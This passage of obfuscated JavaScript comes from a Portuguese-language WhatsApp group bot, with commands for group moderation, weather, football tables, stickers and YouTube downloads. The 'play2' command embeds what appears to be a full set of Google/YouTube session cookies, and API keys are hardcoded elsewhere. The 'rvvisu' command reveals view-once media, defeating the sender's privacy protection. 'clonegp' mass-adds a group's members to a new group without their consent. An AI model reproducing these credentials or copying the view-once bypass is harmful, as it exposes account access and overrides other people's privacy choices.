                    images = n[Math.floor(Math.random() * n.length)].url;
                    teks = "*-----「 GOOGLE IMAGEM 」-----*\n🤠 *Pesquisado por:* " + _0x671b4b + "\n🔗 *Link da Img.:* " + images;
                    _0x3c2c3a(_0x346d97, images, teks);
                  }
                  _0x13a23b();
                } catch (_0x23ab20) {
                  _0x50740b("ERROR: " + _0x23ab20);
                }
              }
              break;
            case "fechamento":
            case "fechargp":
              if (!_0x89cd51) {
                return _0x50740b("SÓ EM GRUPO");
              }
              if (!_0x3f2f63) {
                return _0x50740b("PRECISA SER ADMINISTRADOR");
              }
              if (!_0x42a9f2) {
                return _0x50740b("BOT PRECISA SER ADMINISTRADOR");
              }
              blabla = "▬▬▬.◙.▬▬▬\n═▂▄▄▓▄▄▂\n◢◤😎 █▀▀████▄▄▄▄▄▄◢◤\n█▄ █ :) ██▀▀▀▀▀▀▀╬\n◥█████◤\n══╩══╩══\n\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n\n*⚠️ALERTA!!!*⚠️\n\n🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨\n\n*☝🏻😌 ESTAREMOS FECHANDO🔐 O GRUPO SÓ PRA ADMS 👩🏼‍✈️👩🏽‍✈️👨🏻‍✈️👨‍✈️ PARA EVITARMOS POSTAGENS INCONVENIENTES.🚫❌( NOTAS FAKES💸💳 TRAVAS ♨️📛  OU GRINGOS TARADOS🚷🚮🉐🈺 )*❌🚫 \n*PRIMEIRO ADM A ACORDAR ABRE 🔓 O GP PARA OS MEMBROS👥👤!!!*\n*BOA NOITE E BOM DESCANSO!!* 🌌🌙😴🥱\n*ATÉ MAIS TARDE!!!* 🖤🌹💋\n*NÃO SAIAM DO GP!!!* ✍🏻🤝🏻\n\n🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨\n\n█▄▄▄▄▄▄▄▄▄▄▄▄█";
              const _0x2ac99b = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': blabla,
                'mentions': groupMembers.map(_0x213363 => _0x213363.id)
              }, _0x2ac99b);
              await delay(900);
              await _0x5196be.groupSettingUpdate(_0x346d97, "announcement");
              break;
            case "clonegp":
            case "clonargp":
              if (!_0x89cd51) {
                return _0x50740b("apenas para grupos");
              }
              if (!_0xf59944) {
                return _0x50740b("apenas pro dono");
              }
              if (!_0x11e99e) {
                return _0x50740b("cade o id do grupo?\nUse: o Comando /getgroupid Para Pegar o Id Desse Grupo.");
              }
              getInfoOfGroupID = _0x89cd51 ? await _0x5196be.groupMetadata(_0x11e99e) : '';
              getNameOfGroupID = _0x89cd51 ? getInfoOfGroupID.subject : '';
              getMembersOfGroupID = _0x89cd51 ? getInfoOfGroupID.participants : '';
              getDescOfGroupID = _0x89cd51 ? getInfoOfGroupID.desc : '';
              createGroup = await _0x5196be.groupCreate(getNameOfGroupID, [_0x246d48], "add");
              await _0x5196be.groupUpdateDescription(createGroup.id, getDescOfGroupID);
              for (let _0x18d862 of getMembersOfGroupID) {
                delay(1000);
                await _0x5196be.groupParticipantsUpdate(createGroup.id, [_0x18d862.id], "add");
              }
              const _0xfd6fff = {
                text: "Grupo Criado Com Sucesso!"
              };
              _0x5196be.sendMessage(_0x346d97, _0xfd6fff);
              _0x5196be.groupParticipantsUpdate(createGroup.id, [_0x5bd5f4[0]], "promote");
              const _0x1e06c2 = {
                text: "OIE TUDO BEM?"
              };
              _0x5196be.sendMessage(createGroup.id, _0x1e06c2);
              break;
            case "getgroupid":
              _0x50740b(_0x346d97);
              break;
            case "zerar_gold":
              if (!_0xf59944) {
                return _0x50740b("somente meu dono");
              }
              rggold[_0x3befc0].usus = [];
              _0x326cbd[0].Chances = [];
              _0x137e44(_0x326cbd);
              _0x1564b4(rggold);
              _0x50740b("removido todo gold deste grupo");
              break;
            case "figurinhas2":
              if (!_0x11e99e) {
                return _0x50740b("Insira a quantidade de figurinhas que deseja que eu envie.");
              }
              if (!Number(_0x23d865[0]) || Number(_0x11e99e.trim()) > 10) {
                return _0x50740b("Digite a quantidade de figurinhas que deseja que eu envie, mas não mais do que 10.");
              }
              try {
                _0x5196be.updateBlockStatus(_0x246d48, "unblock");
                qtd = _0x11e99e.trim().replace(/\D/g, '');
                _0x50740b("Enviando...");
                async function _0x31cd1b() {
                  let _0x15f9b6 = Math.floor(Math.random() * 8050 * 1);
                  const _0x16c668 = {
                    url: "https://raw.githubusercontent.com/badDevelopper/Testfigu/main/fig%20(" + _0x15f9b6 + ").webp"
                  };
                  const _0x4d7145 = {
                    sticker: _0x16c668
                  };
                  await _0x5196be.sendMessage(_0x346d97, _0x4d7145);
                }
                for (let _0x1cd6e5 = 0; _0x1cd6e5 < qtd; _0x1cd6e5++) {
                  await _0x31cd1b();
                  await sleep(680);
                }
              } catch {
                _0x50740b("Ocorreu um erro ao enviar as figurinhas.");
              }
              break;
            case "clima":
            case "tempo":
              if (!_0x11e99e) {
                return _0x50740b("Use " + (_0x141936 + _0x267d4b) + " cidade");
              }
              var _0x144599 = ['á', 'â', 'é', 'ê', 'í', 'ó', 'ô', 'ú', 'ç'];
              for (var _0x3194f3 = 0; _0x3194f3 < _0x144599.length; _0x3194f3++) {
                if (_0x11e99e.includes(_0x144599[_0x3194f3])) {
                  return _0x50740b("Por favor, remova os acentos");
                }
              }
              cidade = _0x11e99e;
              clima = await axios.get("https://api.openweathermap.org/data/2.5/weather?q=" + cidade + "&appid=1d0bdf08a222f8f2da252ef8921ff4ab&units=metric&lang=pt_br");
              if (clima.error) {
                return _0x50740b(clima.error);
              }
              hora1 = moment.tz("America/Sao_Paulo").format("HH:mm:ss");
              jr = "\n┌──────TEMPO──────┐\n│‣🌡️ Agora: " + clima.data.main.temp + "ºc\n│‣🏙️ Cidade: " + clima.data.name + "\n┌─────────────┐\n│‣🔺 Temp. max: " + clima.data.main.temp_max + "ºc\n│‣🔻 Temp. min: " + clima.data.main.temp_min + "ºc\n│‣🌦️ Clima: " + clima.data.weather[0].description + "\n│‣💧 Umidade do ar: " + clima.data.main.humidity + "%\n│‣🌬️ Ventos: " + clima.data.wind.speed + "  \n└───────────〔 " + hora1 + " 〕\n";
              const _0x2f57a0 = {
                text: jr
              };
              const _0x5a9d21 = {
                mentionedJid: jr
              };
              const _0x582dac = {
                quoted: _0xd2050d,
                contextInfo: _0x5a9d21
              };
              await _0x5196be.sendMessage(_0x346d97, _0x2f57a0, _0x582dac);
              break;
            case "keyrequest":
              try {
                reskey = await fetchJson("https://api.bronxyshost.com.br/api/keyerrada?apikey=Key_Do-Lotus_Samuel_EsDeath_12/08");
                _0x50740b(reskey.msg);
              } catch {
                _0x50740b("Não consegui acessar a api, ou acabou os requests");
              }
              break;
            case "tabelacamp":
              try {
                let _0x29ebf1 = await fetchJson("http://api.baddeveloper.space:25572/api/tabela?q=20");
                let _0x1afc15 = _0x29ebf1.data;
                if (!_0x1afc15) {
                  return _0x50740b("Nenhum dado encontrado.");
                }
                let _0x2b322b = _0x1afc15.split("\n").filter(_0x368e33 => _0x368e33.trim() !== '');
                let _0x1273a3 = "Classificação | Time         | Pontos\n";
                _0x1273a3 += '-'.repeat(34) + "\n";
                _0x2b322b.forEach(_0x207494 => {
                  let [_0x22e9ab, _0x49a7d4] = _0x207494.split('|');
                  let _0x3bd741 = _0x22e9ab.trim();
                  let _0x51c8b4 = _0x49a7d4.trim();
                  let [_0x2b766c, _0x4e195c] = _0x51c8b4.split("Pontos💠:");
                  let _0x4a697c = _0x2b766c.trim();
                  let _0x78ae11 = _0x4e195c.trim();
                  _0x1273a3 += _0x3bd741.padEnd(12) + " | " + _0x4a697c.padEnd(12) + " | " + _0x78ae11 + "\n";
                });
                _0x50740b(_0x1273a3);
              } catch (_0xaea4f3) {
                console.error(_0xaea4f3);
                _0x50740b("Ocorreu um erro ao buscar os dados da tabela.");
              }
              break;
            case "meutime":
              if (!_0x11e99e) {
                return _0x50740b("Informe o nome do time.");
              }
              try {
                function _0x12992d(_0x4d99b0, _0x499fc9, _0x3a12ba) {
                  return _0x4d99b0 >= 0 ? _0x4d99b0 + " " + _0x499fc9 : _0x4d99b0 + " " + _0x3a12ba;
                }
                let _0x3c90db = await fetchJson("http://api.baddeveloper.space:25572/api/meutime?q=" + _0x11e99e);
                let _0x29cae8 = _0x3c90db.resultado;
                if (!_0x29cae8 || _0x29cae8.length === 0) {
                  return _0x50740b("Nenhum time encontrado.");
                }
                let {
                  teamName: _0x44c932,
                  position: _0x197e06,
                  points: _0x44be1c,
                  gamesPlayed: _0x4597b9,
                  draws: _0x2941be,
                  losses: _0x3206b0,
                  goalsFor: _0x269bf8,
                  goalsAgainst: _0x2cb181,
                  goalDifference: _0x2feec1,
                  approval: _0x3d9bfb
                } = _0x29cae8[0];
                _0x50740b("🏆 Informações do Time 🏆\n\nTime: " + _0x44c932 + " 🎽\nPosição: " + _0x197e06 + " 📊\nPontos: " + (_0x44be1c >= 0 ? _0x44be1c + " " + '⚽️' : _0x44be1c + " " + '❌') + "\nJogos Disputados: " + _0x4597b9 + " 🏃‍♂️\nEmpates: " + (_0x2941be >= 0 ? _0x2941be + " " + '🤝' : _0x2941be + " " + '❌') + "\nDerrotas: " + (_0x3206b0 >= 0 ? _0x3206b0 + " " + '👎' : _0x3206b0 + " " + '✅') + "\nGols Feitos: " + _0x269bf8 + " ⚽️\nGols Sofridos: " + _0x2cb181 + " ⚽️\nSaldo de Gols: " + (_0x2feec1 >= 0 ? _0x2feec1 + " " + '⚽️' : _0x2feec1 + " " + '❌') + "\nAproveitamento: " + (_0x3d9bfb >= 0 ? _0x3d9bfb + " " + '👍' : _0x3d9bfb + " " + '👎') + "\n");
              } catch (_0x1e9d61) {
                console.error("Deu Ruim:", _0x1e9d61.message);
                _0x50740b("Erro ao obter os dados do servidor.");
              }
              break;
            case "rvvisu":
            case "revelarvisu":
            case "rvvisuunica":
              {
                if (!_0x3f2f63) {
                  return _0x50740b("PRECISA SER ADMINISTRADOR");
                }
                if (!_0x42a9f2) {
                  return _0x50740b("BOT PRECISA SER ADMINISTRADOR");
                }
                let _0x2f4de4 = _0xd2050d.message?.["extendedTextMessage"]?.["contextInfo"]?.["quotedMessage"];
                if (!_0x2f4de4 || !_0x2f4de4.viewOnceMessageV2 && !_0x2f4de4.viewOnceMessageV2Extension) {
                  return _0x50740b("Marque uma visualização única para eu revelar.");
                }
                let _0x4f6890 = _0x2f4de4.viewOnceMessageV2?.["message"] || _0x2f4de4.viewOnceMessageV2Extension?.["message"];
                let _0x2e7c2e = _0x4f6890.imageMessage || _0x4f6890.videoMessage || _0x4f6890.audioMessage;
                if (!_0x2e7c2e) {
                  return _0x50740b("Marque uma visualização única de áudio, vídeo ou foto para eu revelar.");
                }
                _0x50740b("Revelando a visualização única...");
                let _0xc2298c;
                if (_0x2e7c2e.audioMessage) {
                  _0xc2298c = await getFileBuffer(_0x2e7c2e.audioMessage, "audio");
                } else {
                  _0xc2298c = await getFileBuffer(_0x2e7c2e, _0x2e7c2e.mimetype.split('/')[0]);
                }
                let _0x52d576 = "~» Visualização Única Revelada Com Sucesso" + (!_0x2e7c2e.caption ? '' : "\n\n~» Legenda: " + _0x2e7c2e.caption);
                _0x5196be.sendMessage(_0x346d97, {
                  [_0x2e7c2e.audioMessage ? "audio" : _0x2e7c2e.mimetype.split('/')[0]]: _0xc2298c,
                  'caption': _0x52d576
                });
              }
              break;
            case "play3":
              try {
                await _0x50740b(enviar.espere);
                let _0x153f84 = await _0x3af65f(_0x11e99e);
                let _0x26f738 = await yts(_0x153f84);
                let _0x1f65fe = "\n๖ۣ• Título: " + (_0x26f738?.["videos"][0]?.["title"] || " Não encontrado.") + "\n๖ۣ• Tempo: " + (_0x26f738?.["videos"][0]?.["timestamp"] || " Não encontrado.") + "\n๖ۣ• Postado: " + (_0x26f738?.["videos"][0]?.["ago"] || " Não encontrado.") + "\n๖ۣ• Canal: " + (_0x26f738?.["videos"][0]?.["author"]?.["name"] || " Não encontrado.") + "\n๖ۣ• Descrição: " + (_0x26f738?.["videos"][0]?.["description"] || " Não encontrado.") + "\n\n■■■■■ 100% \n\nEscolha uma opção...\n\nSe desejar baixar o vídeo, use " + _0x141936 + "play_video " + _0x11e99e.trim();
                let _0x3053db = require("node-yt-dl");
                let _0x478ed7 = await _0x3053db.mp3(_0x153f84);
                if (!_0x478ed7 || !_0x478ed7.media) {
                  throw new Error("Não foi possível obter o link de download do áudio.");
                }
                let _0x573feb = getRandom(".original");
                let _0x501ef2 = _0x573feb.replace(".original", ".ogg");
                let _0x2d4b22 = request(_0x478ed7.media).pipe(fs.createWriteStream(_0x573feb));
                _0x2d4b22.on("finish", () => {
                  exec("ffmpeg -hide_banner -loglevel panic -i " + _0x573feb + " -c:a libopus -ac 1 -avoid_negative_ts make_zero " + _0x501ef2, async _0x2a6bb4 => {
                    if (_0x2a6bb4) {
                      console.error("Erro na conversão: " + _0x2a6bb4.message);
                      return;
                    }
                    try {
                      if (_0x26f738.videos[0].thumbnail) {
                        const _0x5a1e6f = {
                          url: _0x26f738.videos[0].thumbnail
                        };
                        const _0x5e66d4 = {
                          image: _0x5a1e6f,
                          caption: _0x1f65fe,
                          mentions: [_0x246d48]
                        };
                        const _0x27dc0f = {
                          quoted: _0xd2050d
                        };
                        await _0x5196be.sendMessage(_0x346d97, _0x5e66d4, _0x27dc0f);
                      } else {
                        var _0x4ecb87 = _0x257290(logoslink.status1);
                        const _0x4ad595 = {
                          ..._0x4ecb87
                        };
                        _0x4ad595.caption = _0x1f65fe;
                        _0x4ad595.mentions = [_0x246d48];
                        const _0x2dbbc0 = {
                          quoted: _0xd2050d
                        };
                        await _0x5196be.sendMessage(_0x346d97, _0x4ad595, _0x2dbbc0);
                      }
                      await delay(100);
                      const _0x3e1ba2 = {
                        url: './' + _0x501ef2
                      };
                      const _0x4095c1 = {
                        audio: _0x3e1ba2,
                        mimetype: "audio/mpeg"
                      };
                      const _0x5e2029 = {
                        quoted: _0xd2050d
                      };
                      await _0x5196be.sendMessage(_0x346d97, _0x4095c1, _0x5e2029);
                      fs.unlinkSync(_0x573feb);
                      fs.unlinkSync(_0x501ef2);
                    } catch (_0x183f21) {
                      console.error("Erro ao enviar mensagem: " + _0x183f21.message);
                    }
                  });
                });
                _0x2d4b22.on("error", _0x55cf8e => {
                  console.error("Erro durante o download do áudio: " + _0x55cf8e.message);
                  _0x50740b("Erro ao baixar o áudio. Tente novamente mais tarde.");
                });
              } catch (_0x1da7e3) {
                await _0x50740b("*ERRO, MÓDULO DEVE TER CAÍDO OU ESTÁ EM MANUTENÇÃO. TENTE NOVAMENTE MAIS TARDE* " + _0x1da7e3);
              }
              break;
            case "play3_video":
              try {
                await _0x50740b(enviar.espere);
                let _0x1fa05a = await _0x3af65f(_0x11e99e);
                let _0xc10ab5 = await yts(_0x1fa05a);
                let _0x1557b0 = "\n๖ۣ• Título: " + (_0xc10ab5?.["videos"][0]?.["title"] || " Não encontrado.") + "\n๖ۣ• Tempo: " + (_0xc10ab5?.["videos"][0]?.["timestamp"] || " Não encontrado.") + "\n๖ۣ• Postado: " + (_0xc10ab5?.["videos"][0]?.["ago"] || " Não encontrado.") + "\n๖ۣ• Canal: " + (_0xc10ab5?.["videos"][0]?.["author"]?.["name"] || " Não encontrado.") + "\n๖ۣ• Descrição: " + (_0xc10ab5?.["videos"][0]?.["description"] || " Não encontrado.") + "\n\n■■■■■ 100% \n\nEscolha uma opção...\n\nSe desejar baixar o vídeo, use " + _0x141936 + "play_video " + _0x11e99e.trim();
                let _0x9ea513 = require("node-yt-dl");
                let _0x22adcb = await _0x9ea513.mp4(_0x1fa05a);
                if (!_0x22adcb || !_0x22adcb.media) {
                  throw new Error("Não foi possível obter o link de download do vídeo.");
                }
                let _0xd6be3c = getRandom(".mp4");
                let _0x4a37c0 = request(_0x22adcb.media).pipe(fs.createWriteStream(_0xd6be3c));
                _0x4a37c0.on("finish", async () => {
                  try {
                    await delay(100);
                    const _0x10df32 = {
                      url: './' + _0xd6be3c
                    };
                    const _0x2a130a = {
                      video: _0x10df32,
                      mimetype: "video/mp4",
                      caption: _0x1557b0
                    };
                    const _0x61f39f = {
                      quoted: _0xd2050d
                    };
                    await _0x5196be.sendMessage(_0x346d97, _0x2a130a, _0x61f39f);
                    fs.unlinkSync(_0xd6be3c);
                  } catch (_0x25a0b5) {
                    console.error("Erro ao enviar mensagem: " + _0x25a0b5.message);
                  }
                });
                _0x4a37c0.on("error", _0x508eeb => {
                  console.error("Erro durante o download do vídeo: " + _0x508eeb.message);
                  _0x50740b("Erro ao baixar o vídeo. Tente novamente mais tarde.");
                });
              } catch (_0x329e9c) {
                await _0x50740b("*ERRO, MÓDULO DEVE TER CAÍDO OU ESTÁ EM MANUTENÇÃO. TENTE NOVAMENTE MAIS TARDE* " + _0x329e9c);
              }
              break;
            case "playdoc2":
              try {
                await _0x50740b(enviar.espere);
                let _0x42ca5b = await _0x3af65f(_0x11e99e);
                let _0xc23c47 = getRandom(".m4a");
                let _0x2acd57 = await yts(_0x42ca5b);
                let _0x1dfa67 = "\n๖ۣ• Título: " + (_0x2acd57?.["videos"][0]?.["title"] || " Não encontrado.") + "\n๖ۣ• Tempo: " + (_0x2acd57?.["videos"][0]?.["timestamp"] || " Não encontrado.") + "\n๖ۣ• Postado: " + (_0x2acd57?.["videos"][0]?.["ago"] || " Não encontrado.") + "\n๖ۣ• Canal: " + (_0x2acd57?.["videos"][0]?.["author"]?.["name"] || " Não encontrado.") + "\n๖ۣ• Descrição: " + (_0x2acd57?.["videos"][0]?.["description"] || " Não encontrado.") + "\n\n■■■■■ 100% \n\nEscolha uma opção...\n\nSe desejar baixar o vídeo, use " + _0x141936 + "play_video " + _0x11e99e.trim() + "\n";
                let {
                  yt: _0x541d2c,
                  ytmp3: _0x388ff9,
                  ytmp4: _0x11a067
                } = require("@nechlophomeriaa/ytdl");
                let _0x392c1d = await _0x388ff9(_0x42ca5b);
                console.log(_0x392c1d);
                if (!_0x392c1d || !_0x392c1d.url) {
                  throw new Error("Não foi possível obter a URL do áudio.");
                }
                let _0x5de329 = _0xc23c47.replace(".m4a", ".ogg");
                let _0x2f1e29 = request(_0x392c1d.url).pipe(fs.createWriteStream(_0xc23c47));
                _0x2f1e29.on("finish", () => {
                  exec("ffmpeg -hide_banner -loglevel panic -i " + _0xc23c47 + " -c:a libopus -ac 1 -avoid_negative_ts make_zero " + _0x5de329, async _0x18dc09 => {
                    if (_0x18dc09) {
                      console.error("Erro na conversão: " + _0x18dc09.message);
                      return;
                    }
                    try {
                      if (_0x2acd57.videos[0].thumbnail) {
                        const _0x2aaa96 = {
                          url: _0x2acd57.videos[0].thumbnail
                        };
                        const _0x31cdea = {
                          image: _0x2aaa96,
                          caption: _0x1dfa67,
                          mentions: [_0x246d48]
                        };
                        const _0x41be0a = {
                          quoted: _0xd2050d
                        };
                        await _0x5196be.sendMessage(_0x346d97, _0x31cdea, _0x41be0a);
                      } else {
                        var _0x49a791 = _0x257290(logoslink.status1);
                        const _0x2e8284 = {
                          ..._0x49a791
                        };
                        _0x2e8284.caption = _0x1dfa67;
                        _0x2e8284.mentions = [_0x246d48];
                        const _0x21846a = {
                          quoted: _0xd2050d
                        };
                        await _0x5196be.sendMessage(_0x346d97, _0x2e8284, _0x21846a);
                      }
                      await delay(100);
                      const _0x6411d1 = {
                        url: './' + _0x5de329
                      };
                      const _0x3d7647 = {
                        document: _0x6411d1,
                        mimetype: "audio/mpeg",
                        fileName: "musica.mp3"
                      };
                      const _0xee2c98 = {
                        quoted: _0xd2050d
                      };
                      await _0x5196be.sendMessage(_0x346d97, _0x3d7647, _0xee2c98);
                      fs.unlinkSync(_0xc23c47);
                      fs.unlinkSync(_0x5de329);
                    } catch (_0x157dce) {
                      console.error("Erro ao enviar mensagem: " + _0x157dce.message);
                    }
                  });
                });
              } catch (_0x150fa9) {
                await _0x50740b("*ERRO, MÓDULO DEVE TER CAÍDO OU ESTÁ EM MANUTENÇÃO. TENTE NOVAMENTE MAIS TARDE* " + _0x150fa9);
              }
              break;
            case "play2":
              try {
                await _0x50740b(enviar.espere);
                let _0x3305fd = await _0x3af65f(_0x11e99e);
                let _0x2e9dae = getRandom(".m4a");
                let _0x258f90 = await yts(_0x3305fd);
                let _0x404c6c = "\n๖ۣ• Título: " + (_0x258f90?.["videos"][0]?.["title"] || " Não encontrado.") + "\n๖ۣ• Tempo: " + (_0x258f90?.["videos"][0]?.["timestamp"] || " Não encontrado.") + "\n๖ۣ• Postado: " + (_0x258f90?.["videos"][0]?.["ago"] || " Não encontrado.") + "\n๖ۣ• Canal: " + (_0x258f90?.["videos"][0]?.["author"]?.["name"] || " Não encontrado.") + "\n๖ۣ• Descrição: " + (_0x258f90?.["videos"][0]?.["description"] || " Não encontrado.") + "\n\n■■■■■ 100% \n\nEscolha uma opção...\n\nSe desejar baixar o vídeo, use " + _0x141936 + "play_video " + _0x11e99e.trim();
                const _0x49ad18 = {
                  name: "__Secure-1PAPISID",
                  value: "7NgrLGifrlPSLsyR/AjQsOwpBrfzScmHVB"
                };
                const _0x156ec1 = {
                  name: "__Secure-1PSID",
                  value: "g.a000mQgyzFsftekxSgND2SmLvbCWGf23EreDWNufLGoFOOLto_VbJgSUPhh3bEwhzrkOHMLMHwACgYKAU4SARESFQHGX2MiM-oyuOL1nRhl1H1KZ2sC5hoVAUF8yKogZVjcTEViCJ6perSc5KKi0076"
                };
                const _0x9eead7 = {
                  name: "__Secure-1PSIDCC",
                  value: "AKEyXzVyZpf1Zp5uR7k6I7ovhsUV0m_bZmS0ccR6Cja_SVOQjOjqAZSk4XNAWqlf48dwLGo3xA"
                };
                const _0x2f1190 = {
                  name: "__Secure-1PSIDTS",
                  value: "sidts-CjIB4E2dkdJEVQ6Xp1pcGYoy8uPj7EPDaLhp79m8Fy2MMvReOmlNYKZdLMy4Y0BOQ3F9ARAA"
                };
                const _0x62b8d7 = {
                  name: "__Secure-3PAPISID",
                  value: "7NgrLGifrlPSLsyR/AjQsOwpBrfzScmHVB"
                };
                const _0x40a0ee = {
                  name: "__Secure-3PSID",
                  value: "g.a000mQgyzFsftekxSgND2SmLvbCWGf23EreDWNufLGoFOOLto_VbPTxOGJCHFE-v9VpeGL3a8gACgYKAXESARESFQHGX2MiMf-WsPMc6I5mVepH7ApE_hoVAUF8yKr-2AHa748uDCWH8_0iusAC0076"
                };
                const _0x5d4d2b = {
                  name: "__Secure-3PSIDCC",
                  value: "AKEyXzU8Hu6-Ij5HvtheOiV5liafNsHtl37Ms7xeFIdZp7J9mfWOvnPl-VnNAA5E7aXj6OYgBw"
                };
                const _0x1f7179 = {
                  name: "__Secure-3PSIDTS",
                  value: "sidts-CjIB4E2dkdJEVQ6Xp1pcGYoy8uPj7EPDaLhp79m8Fy2MMvReOmlNYKZdLMy4Y0BOQ3F9ARAA"
                };
                const _0x148a51 = {
                  name: "APISID",
                  value: "I37OTVV9ykWoPRJu/A3T33r7p0sGhfe291"
                };
                const _0x32143e = {
                  name: "GPS",
                  value: '1'
                };
                const _0x663586 = {
                  name: "HSID",
                  value: "A42rzRqP_s-QWr0ml"
                };
                const _0x3e5c55 = {
                  name: "LOGIN_INFO",
                  value: "AFmmF2swRgIhAJPq-rG0Ntt1PDmdc4ATchtPxHmiTcBaCO9hpdM8bxgPAiEA9LKbZaJaDsbpF8BsgRC4YRkUWyoJahyVUr4qQKhLIlw:QUQ3MjNmenIyS09GeHNEdzZCellOZUN5RURvaDF5WlRwbWdZVVNXYWxjSjlrVHczemo3aXpUQXRTXzZWSUdsQnMybFRtSDh6T0ExR3RuZmRyN3JQaWZkZXIxOW04WXRLTXRFdlFtZG5zZFcwdC01MWl5NEtDWWJBakxTdzllSWxPTHZ4QVhlM21CMDc5aXM0MWpTUWt3NFFWWTJhdVRzMDlR"
                };
                const _0x348bd6 = {
                  name: "PREF",
                  value: "f6=40000000&tz=America.Sao_Paulo"
                };
                const _0x3f2dde = {
                  name: "SAPISID",
                  value: "7NgrLGifrlPSLsyR/AjQsOwpBrfzScmHVB"
                };
                const _0x37ed5c = {
                  name: "SID",
                  value: "g.a000mQgyzFsftekxSgND2SmLvbCWGf23EreDWNufLGoFOOLto_VbScpJ6BC7KruHA-zReqkZ0wACgYKAakSARESFQHGX2Mi41ScJIIf05sJX9jZ02NAGRoVAUF8yKpUEwIVt7co3Np0LftztZEi0076"
                };
                const _0x4b01c3 = {
                  name: "SIDCC",
                  value: "AKEyXzVtKHICnbQtEnctIW-Bf92d3D_qoXAVjzuil1eISKKXXSckgkU1eoWLVzf0r8L7CW5u"
                };
                const _0x3886a5 = {
                  name: "SSID",
                  value: "AkUA8tatBJP-Pe-gC"
                };
                let _0x4bfff2 = [_0x49ad18, _0x156ec1, _0x9eead7, _0x2f1190, _0x62b8d7, _0x40a0ee, _0x5d4d2b, _0x1f7179, _0x148a51, _0x32143e, _0x663586, _0x3e5c55, _0x348bd6, _0x3f2dde, _0x37ed5c, _0x4b01c3, _0x3886a5];
                let _0x4fd9da = ytdl.createAgent(_0x4bfff2);
                let _0x1ba560 = ytdl(_0x3305fd, {
                  'quality': "140",
                  'agent': _0x4fd9da
                }).pipe(fs.createWriteStream(_0x2e9dae));
                _0x1ba560.on("finish", () => {
                  let _0x288119 = _0x2e9dae.replace(".m4a", ".ogg");
                  exec("ffmpeg -hide_banner -loglevel panic -i " + _0x2e9dae + " -c:a libopus -ac 1 -avoid_negative_ts make_zero " + _0x288119, async (_0x5d092a, _0x3dcd11, _0xdef292) => {
                    if (_0x5d092a) {
                      console.error("Erro na conversão: " + _0x5d092a.message);
                      return;
                    }
                    async function _0x257c50() {
                      if (_0x258f90.videos[0].thumbnail) {
                        const _0x1d6871 = {
                          url: _0x258f90.videos[0].thumbnail
                        };
                        const _0x5e9b56 = {
                          image: _0x1d6871,
                          caption: _0x404c6c,
                          mentions: [_0x246d48]
                        };
                        const _0x47d460 = {
                          quoted: _0xd2050d
                        };
                        await _0x5196be.sendMessage(_0x346d97, _0x5e9b56, _0x47d460);
                      } else {
                        var _0x2d2cb8 = _0x257290(logoslink.status1);
                        const _0x29757b = {
                          ..._0x2d2cb8
                        };
                        _0x29757b.caption = _0x404c6c;
                        _0x29757b.mentions = [_0x246d48];
                        const _0x23169a = {
                          quoted: _0xd2050d
                        };
                        await _0x5196be.sendMessage(_0x346d97, _0x29757b, _0x23169a);
                      }
                      await delay(100);
                      const _0x2ce62e = {
                        url: './' + _0x288119
                      };
                      const _0x5a81bb = {
                        audio: _0x2ce62e,
                        mimetype: "audio/mpeg"
                      };
                      const _0x33c362 = {
                        quoted: _0xd2050d
                      };
                      await _0x5196be.sendMessage(_0x346d97, _0x5a81bb, _0x33c362).then(() => {
                        fs.unlinkSync(_0x2e9dae);
                        fs.unlinkSync(_0x288119);
                      });
                    }
                    _0x257c50();
                  });
                });
              } catch (_0x2feb7d) {
                _0x50740b("*ERRO, MÓDULO DEVE TER CAÍDO OU ESTÁ EM MANUTENÇÃO. TENTE NOVAMENTE MAIS TARDE* " + _0x2feb7d);
              }
              break;
            case "esdeath":
              const _0x5610dc = {
                text: '❄️',
                key: _0xd2050d.key
              };
              const _0x3f9bab = {
                react: _0x5610dc
              };
              _0x4f0b32 = _0x3f9bab;
              linkESD = _0xf59944 ? "https://telegra.ph/file/6101961ea5dbf0b91548b.jpg" : _0x3f2f63 ? "https://telegra.ph/file/059127efa29d93f315255.jpg" : "https://telegra.ph/file/e272a244dd47d555e6e47.jpg";
              _0x5196be.sendMessage(_0x346d97, _0x4f0b32);
              delay(100);
              _0x125a55(_0x346d97, linkESD);
              break;
            case "pesquisarfig":
              try {
                if (!_0x11e99e) {
                  return _0x50740b("Digite o nome da imagem que vc quer buscar\nExemplo: " + (_0x141936 + _0x267d4b) + " cat");
                }
                _0x50740b(enviar.espere);
                let _0x16b5db = await fetchJson("https://api.bronxyshost.com.br/api-bronxys/pinterest?nome=" + _0x11e99e + "&apikey=" + "Key_Do-Lotus_Samuel_EsDeath_12/08");
                _0x125a55(_0x346d97, _0x16b5db[Math.floor(Math.random() * _0x16b5db.length)], enviar.success)["catch"](_0x59e934 => {
                  _0x50740b("ERROR!!");
                });
              } catch (_0xbe865a) {
                if (JSON.stringify(_0xbe865a).includes("Key_Do-Lotus_Samuel_EsDeath_12/08")) {
                  return console.log("A api caiu ou não foi possivel executar esta ação., espere retornar");
                } else {
                  _0x50740b("ERROR!!");
                }
              }
              break;
            case "webcorno":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Só pode ser utilizado este comando, em grupo.");
                }
                if (!_0x5c6233) {
                  return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x141936 + "modobrincadeira 1");
                }
                rate = _0x3ac611.slice(9);
                _0x5196be.sendMessage(_0x346d97, {
                  'text': " ❰ Pesquisando a sua ficha de chance de Ser WebCorno : " + rate + " aguarde... ❱"
                });
                setTimeout(async () => {
                  wew = "https://telegra.ph/file/f07e7916b981fa415a9d1.jpg";
                  let _0x39d250 = '' + Math.floor(Math.random() * 110);
                  const _0x1de1eb = {
                    url: wew
                  };
                  const _0x44e2a1 = {
                    quoted: _0xd2050d
                  };
                  await _0x5196be.sendMessage(_0x346d97, {
                    'image': _0x1de1eb,
                    'caption': "[🦬] " + rate + (" A chance de você Ser WebCorno é de " + _0x39d250 + "% [🦬]")
                  }, _0x44e2a1);
                }, 7000);
              }
              break;
            case "ceu":
              if (!_0x89cd51) {
                return _0x50740b("Só pode ser utilizado este comando, em grupo.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
